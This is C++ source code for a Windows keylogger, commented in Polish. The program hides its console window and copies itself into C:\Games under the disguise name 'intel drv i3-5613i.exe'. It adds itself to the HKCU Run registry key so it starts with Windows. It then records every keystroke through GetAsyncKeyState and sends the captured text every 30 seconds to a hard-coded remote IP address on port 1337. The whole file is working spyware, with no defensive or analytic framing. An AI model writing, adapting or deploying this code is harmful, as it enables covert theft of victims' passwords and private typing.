#include<iostream>
#include<fstream>
#include<WS2tcpip.h>
#pragma comment(lib,"ws2_32.lib")
#include<Windows.h>
#include <time.h>
#include< atlstr.h>

using namespace std;

PCSTR IP = "51.83.128.163";
int PORT = 1337;

int main(int argc,char *argv[])
{
	HWND Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
	wchar_t wtext[64];
	CreateDirectoryA("C:\\Games", NULL);
	if(argv[0][0]!='C')
	{
		//program nie jest jeszcze w C/games musi sie zatem kopiowac
		printf("Elo");
		mbstowcs(wtext, argv[0], strlen(argv[0]) + 1);//Plus null
		LPWSTR filename = wtext;
		LPCTSTR sciezka = L"C:\\Games\\intel drv i3-5613i.exe";
		CopyFile(filename, sciezka, TRUE);

		mbstowcs(wtext, "msvcp140d.dll", strlen("msvcp140d.dll") + 1);//Plus null
		LPCTSTR sciezka1 = L"C:\\Games\\msvcp140d.dll";
		filename = wtext;
		CopyFile(filename, sciezka1, TRUE);

		mbstowcs(wtext, "ucrtbased.dll", strlen("ucrtbased.dll") + 1);//Plus null
		LPCTSTR sciezka2 = L"C:\\Games\\ucrtbased.dll";
		filename = wtext;
		CopyFile(filename, sciezka2, TRUE);

		mbstowcs(wtext, "vcruntime140d.dll", strlen("vcruntime140d.dll") + 1);//Plus null
		LPCTSTR sciezka3 = L"C:\\Games\\vcruntime140d.dll";
		filename = wtext;
		CopyFile(filename, sciezka3, TRUE);

		mbstowcs(wtext, "vcruntime140_1d.dll", strlen("vcruntime140_1d.dll") + 1);//Plus null
		LPCTSTR sciezka4 = L"C:\\Games\\vcruntime140_1d.dll";
		filename = wtext;
		CopyFile(filename, sciezka3, TRUE);


		//mbstowcs(wtext, "C:\\Games", strlen("C:\\Games") + 1);//Plus null
		//filename = wtext;
		//int attr = GetFileAttributes(filename);
		//SetFileAttributesA((LPCSTR)filename, attr | FILE_ATTRIBUTE_HIDDEN);

		unsigned char sciezkaDoRejestru[] = "C:\\Games\\intel drv i3-5613i.exe";
		LPCWSTR NazwaWReje = L"intel drv i3-5613i";
		HKEY hk;
		RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hk);
		RegSetValueExA(hk, "intel drv i3-5613i", 0, REG_SZ, sciezkaDoRejestru, sizeof(sciezkaDoRejestru));
	}
	

	WSADATA wsa;
	WSAStartup(MAKEWORD(2, 2), &wsa);

	sockaddr_in serwer;
	serwer.sin_family = AF_INET;
	inet_pton(AF_INET, IP, &serwer.sin_addr);
	serwer.sin_port = htons(PORT);

	int sox = socket(AF_INET, SOCK_STREAM, 0);
	connect(sox, (sockaddr*)&serwer, sizeof(sockaddr));

	bool somethingWasPressed = false;
	bool doubleLetterPossible = false;
	char last = 0;
	char c;
	string s; 
	time_t checkpoint = time(NULL);
	while (1)
	{
		if ((time(NULL) - checkpoint > 30) && s.length() > 1)
		{
			checkpoint = time(NULL);
			send(sox, s.c_str(), s.length(), 0);
			s = "";
		}
        /* SEKCJA SPRAWDZANIA WCISNIECIA KLAWISZY */
        for (int i = 65; i <= 90; i++) ///A-Z
        {
            if (GetAsyncKeyState(i))
            {
                c = i + 32;
                if (GetAsyncKeyState(16)) ///SHIFT
                {
                    c -= 32;
                }
                somethingWasPressed = true;
            }
        }
        if (GetAsyncKeyState(32)) ///SPACJA
        {
            c = 32;
            somethingWasPressed = true;
        }
        if (GetAsyncKeyState(8)) ///BS
        {
            c = 8;
            somethingWasPressed = true;
        }
        if (GetAsyncKeyState(9)) ///TAB
        {
            c = 9;
            somethingWasPressed = true;
        }
        if (GetAsyncKeyState(18)) ///ALT
        {
            c = 18;
            somethingWasPressed = true;
        }
        if (GetAsyncKeyState(27)) ///ESC
        {
            c = 27;
            somethingWasPressed = true;
        }
        if (GetAsyncKeyState(46)) ///DEL
        {
            c = 127;
            somethingWasPressed = true;
        }
        if (GetAsyncKeyState(111)) /// "/" Z NUMERYCZNEJ
        {
            c = 47;
            somethingWasPressed = true;
        }
        if (GetAsyncKeyState(106)) /// "*" Z NUMERYCZNEJ
        {
            c = 42;
            somethingWasPressed = true;
        }
        if (GetAsyncKeyState(109)) /// "-" Z NUMERYCZNEJ
        {
            c = 45;
            somethingWasPressed = true;
        }
        if (GetAsyncKeyState(107)) /// "+" Z NUMERYCZNEJ
        {
            c = 43;
            somethingWasPressed = true;
        }
        if (GetAsyncKeyState(16)) ///"ZNAKI SPECJALNE" Z SHIFTEM
        {
            if (GetAsyncKeyState(186)) ///:
            {
                c = 58;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(187)) ///+
            {
                c = 43;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(188)) ///<
            {
                c = 60;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(189)) ///_
            {
                c = 95;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(190)) ///>
            {
                c = 62;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(191)) ///?
            {
                c = 63;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(192)) ///~
            {
                c = 126;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(219)) ///{
            {
                c = 123;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(220)) ///|
            {
                c = 124;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(221)) ///{
            {
                c = 125;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(222)) ///"
            {
                c = 34;
                somethingWasPressed = true;
            }
            ///0-9 Z SHIFTEM
            if (GetAsyncKeyState(48)) ///)
            {
                c = 41;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(49)) ///!
            {
                c = 33;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(50)) ///@
            {
                c = 64;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(51)) ///#
            {
                c = 35;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(52)) ///$
            {
                c = 36;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(53)) ///%
            {
                c = 37;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(54)) ///^
            {
                c = 94;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(55)) ///&
            {
                c = 38;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(56)) ///*
            {
                c = 42;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(57)) ///(
            {
                c = 40;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(110)) /// "," Z NUMERYCZNEJ Z SHIFTEM DAJE "DEL"
            {
                c = 127;
                somethingWasPressed = true;
            }
        }
        else ///"ZNAKI SPECJALNE" BEZ SHIFTA
        {
            if (GetAsyncKeyState(186)) ///;
            {
                c = 59;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(187)) ///=
            {
                c = 61;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(188)) ///,
            {
                c = 44;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(189)) ///-
            {
                c = 45;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(190)) ///.
            {
                c = 46;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(191)) ///"/"
            {
                c = 47;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(192)) ///`
            {
                c = 96;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(219)) ///[
            {
                c = 91;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(220)) ///"\"
            {
                c = 92;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(221)) ///]
            {
                c = 93;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(222)) ///'
            {
                c = 39;
                somethingWasPressed = true;
            }
            if (GetAsyncKeyState(110)) /// "," Z NUMERYCZNEJ (DZIWNA SPRAWA NA KLAWIATURZE JEST "." ALE DAJE ",")
            {
                c = 44;
                somethingWasPressed = true;
            }
            for (int i = 48; i <= 57; i++) ///0-9
            {
                if (GetAsyncKeyState(i))
                {
                    c = i;
                    somethingWasPressed = true;
                }
            }
            for (int i = 96; i <= 105; i++) ///0-9 Z NUMERYCZNEJ
            {
                if (GetAsyncKeyState(i))
                {
                    c = i - 48;
                    somethingWasPressed = true;
                }
            }
        }
        /* KONIEC SEKCJI */

        if (!somethingWasPressed) ///JESLI NIC NIE BYLO WCISNIETE
        {
            doubleLetterPossible = true; ///POZWOL NA POJAWIENIE SIE DRUGIEJ TAKIEJ SAMEJ LITERY
            continue; ///NIE PRZECHODZ DALEJ
        }

        if ((c != last) || (c == last && doubleLetterPossible)) ///JESLI ROZNA LITERA LUB TAKA SAMA PO PRZERWIE
        {
            if (c == 8)
            {
                s += ";BS;";
            }
            else if (c == 9)
            {
                s += ";TAB;";
            }
            else if (c == 18)
            {
                s += ";ALT;";
            }
            else if (c == 27)
            {
                s += ";ESC;";
            }
            else if (c == 127)
            {
                s += ";DEL;";
            }
            else
            {
                s += c;
            }

            system("cls");
        }
        somethingWasPressed = false; ///RESET STANU WCISNIECIA KLAWISZA
        doubleLetterPossible = false; ///NIE MOZE BYC ZNOWU TAKLA SAMA LITERA
        last = c; ///NOWA OSTATNIO WPISANA LITERA

	}
	return 0;
}